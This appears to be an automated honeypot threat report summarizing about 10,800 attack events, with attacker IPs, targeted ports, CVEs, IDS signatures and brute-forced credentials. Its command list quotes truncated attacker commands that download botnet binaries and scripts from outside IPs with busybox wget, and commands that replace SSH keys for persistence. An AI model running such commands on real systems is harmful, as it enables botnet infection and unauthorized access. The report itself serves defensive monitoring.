Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-02T16:01:28Z
**Timeframe of Analysis:** 2025-10-02T15:20:01Z to 2025-10-02T16:00:01Z
**Log Files Analyzed:**
- agg_log_20251002T152001Z.json
- agg_log_20251002T154001Z.json
- agg_log_20251002T160001Z.json

### Executive Summary
This report summarizes 10,852 security events captured by the honeypot network. The majority of attacks were detected by the Cowrie, Suricata, and Ciscoasa honeypots. The most prominent attack vector observed was related to the DoublePulsar backdoor, indicating widespread automated exploit attempts. A significant number of brute-force login attempts and command injections were also recorded.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 3364
- Suricata: 2492
- Ciscoasa: 2656
- Dionaea: 938
- Mailoney: 872
- Honeytrap: 177
- Tanner: 93
- Adbhoney: 68
- Sentrypeer: 78
- Redishoneypot: 25
- H0neytr4p: 27
- Miniprint: 17
- ElasticPot: 7
- ConPot: 11
- Honeyaml: 9
- Ipphoney: 6
- Dicompot: 3
- Heralding: 7
- ssh-rsa: 2

**Top Attacking IPs:**
- 87.117.5.129: 1429
- 176.65.141.117: 820
- 116.193.191.209: 854
- 78.30.0.151: 382
- 186.167.6.82: 322
- 92.63.197.55: 356
- 185.156.73.166: 362
- 190.0.63.226: 288
- 92.63.197.59: 326
- 203.195.82.181: 301
- 121.228.31.181: 203
- 61.246.230.194: 193
- 14.103.117.86: 189
- 147.93.189.166: 169
- 194.33.105.148: 201

**Top Targeted Ports/Protocols:**
- 445: 2136
- 22: 511
- 25: 866
- 3306: 206
- 80: 97
- 5060: 78
- 23: 65
- 6379: 25
- 443: 27
- 1080: 44

**Most Common CVEs:**
- CVE-2002-0013 CVE-2002-0012: 6
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 3
- CVE-2021-35394 CVE-2021-35394: 3
- CVE-2019-11500 CVE-2019-11500: 2
- CVE-2021-3449 CVE-2021-3449: 2
- CVE-2024-4577 CVE-2024-4577: 2
- CVE-2024-4577 CVE-2002-0953: 2
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773: 1
- CVE-2021-42013 CVE-2021-42013: 1

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 12
- `lockr -ia .ssh`: 12
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`: 12
- `cat /proc/cpuinfo | grep name | wc -l`: 12
- `Enter new UNIX password: `: 9
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...`: 10
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://89.144.20.51/w.sh...`: 4

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1427
- ET DROP Dshield Block Listed Source group 1: 229
- ET SCAN NMAP -sS window 1024: 161
- ET INFO Reserved Internal IP Traffic: 57
- GPL INFO SOCKS Proxy attempt: 34
- ET SCAN Potential SSH Scan: 21

**Users / Login Attempts:**
- operator/: 200
- 345gs5662d34/345gs5662d34: 10
- root/nPSpP4PBW0: 8
- seekcy/Joysuch@Locate2023: 3
- superuser/superuser: 2
- root/wg123456@: 2
- root/sh6668: 2
- vboxuser/vboxuser: 2
- seekcy/Joysuch@Locate2021: 2
- admin/trx: 2

**Files Uploaded/Downloaded:**
- arm.urbotnetisass: 10
- arm5.urbotnetisass: 10
- arm6.urbotnetisass: 10
- arm7.urbotnetisass: 10
- x86_32.urbotnetisass: 10
- mips.urbotnetisass: 10
- mipsel.urbotnetisass: 10
- wget.sh: 16
- sh: 98
- json: 9

**HTTP User-Agents:**
- No user agents were reported in this timeframe.

**SSH Clients and Servers:**
- No specific SSH clients or servers were reported in this timeframe.

**Top Attacker AS Organizations:**
- No AS organizations were reported in this timeframe.

### Key Observations and Anomalies
- The high number of events related to the "DoublePulsar Backdoor" signature suggests a targeted campaign against SMB services.
- Attackers frequently attempt to download and execute malicious shell scripts and binaries (e.g., `urbotnetisass`, `w.sh`), indicating attempts to enlist the honeypot in a botnet.
- The most common commands executed after gaining access involve reconnaissance (`uname -a`, `whoami`, `lscpu`) and attempts to secure access by adding SSH keys.
- A wide variety of credentials were attempted, with a significant number of attempts using the username 'operator'.

This report provides a snapshot of the threat landscape as observed by our honeypot network. Continuous monitoring is recommended.